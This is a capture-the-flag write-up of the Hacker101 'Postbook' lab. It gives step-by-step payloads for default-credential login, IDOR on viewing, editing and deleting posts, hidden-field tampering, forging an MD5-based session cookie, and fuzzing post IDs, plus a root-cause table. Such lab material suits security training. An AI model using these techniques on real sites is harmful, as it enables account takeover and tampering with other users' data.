# 📒 Postbook

> **Platform:** Hacker101 CTF &nbsp;|&nbsp; **Difficulty:** `Easy` &nbsp;|&nbsp; **Flags:** `7/7` ✅

---

## ⛓️ Attack Chain

```
Weak credentials → IDOR on posts/profiles → Hidden field manipulation → Cookie tampering → Delete IDOR → Hidden post fuzzing
```

---

## 🔍 Application Overview

A simple blog platform where users can sign up, create posts, edit them, and delete them. Every single user action — viewing, creating, editing, deleting — is vulnerable to IDOR because the app trusts client-supplied IDs without verifying ownership.

---

## 🚩 Flag 0 — Weak Credentials

Login with default credentials:

```
username: user
password: password
```

Flag appears on login.

---

## 🚩 Flag 1 — IDOR on View Post

View one of your own posts. The URL looks like:
```
/index.php?page=view.php&id=2
```

Change the `id` to `1`. You'll see the admin's post and the flag.

---

## 🚩 Flag 2 — Hidden Field Manipulation (Create Post as Admin)

Go to "Write a new post". Open DevTools → Inspector and find the hidden field inside the form:

```html
<input type="hidden" name="user_id" value="2">
```

Change `value="2"` to `value="1"` and submit the post. The flag appears — the post is now created as admin.

---

## 🚩 Flag 3 — Cookie Tampering

Your session cookie `id` is just an MD5 hash of your user ID:

```
id=c81e728d9d4c2f636f067f89cc14862c  →  MD5 of 2
```

Change it to the MD5 of `1` (admin):

```
id=c4ca4238a0b923820dcc509a6f75849b
```

Refresh the page. You're now logged in as admin. Flag appears.

---

## 🚩 Flag 4 — IDOR on Edit Post

Click "Edit" on one of your posts. The URL looks like:
```
/index.php?page=edit.php&id=4
```

Change `id` to `1`. Edit the admin's post and save. Flag appears.

---

## 🚩 Flag 5 — IDOR on Delete Post (MD5 Hash)

The delete request uses an MD5 hash of the post ID:

```
/index.php?page=delete.php&id=c81e728d9d4c2f636f067f89cc14862c
```

Replace the hash with the MD5 of `1`:

```
/index.php?page=delete.php&id=c4ca4238a0b923820dcc509a6f75849b
```

Visit the URL. Admin's post is deleted. Flag appears.

> 💡 **MD5 reference:**  
> `1` → `c4ca4238a0b923820dcc509a6f75849b`  
> `2` → `c81e728d9d4c2f636f067f89cc14862c`

---

## 🚩 Flag 6 — Hidden Post (Fuzzing)

There is a post not listed on the homepage. Fuzz `view.php?id=` from 1 to 1000 using Burp Intruder (Payload type: Numbers, Range: 1–1000). Sort results by response length.

The hidden post is at:
```
/index.php?page=view.php&id=945
```

Flag is inside the post.

---

## 🧠 Why It Works

| Vulnerability | Root Cause |
|---|---|
| Weak credentials | Default password never changed |
| IDOR (view/edit/delete) | Server trusts client-supplied `id` without ownership check |
| Hidden field manipulation | `user_id` sent from the browser with no server-side validation |
| Cookie tampering | Session cookie is MD5 of user ID — predictable and forgeable |
| Hidden post | Sequential post IDs with no access control on unlisted posts |

---

## 📋 Payloads

```
# Flag 0 — Default login
username: user | password: password

# Flag 1 — View admin post
/index.php?page=view.php&id=1

# Flag 2 — Hidden field (DevTools)
<input type="hidden" name="user_id" value="1">

# Flag 3 — Cookie tamper
id=c4ca4238a0b923820dcc509a6f75849b

# Flag 4 — Edit admin post
/index.php?page=edit.php&id=1

# Flag 5 — Delete admin post
/index.php?page=delete.php&id=c4ca4238a0b923820dcc509a6f75849b

# Flag 6 — Hidden post
/index.php?page=view.php&id=945
```
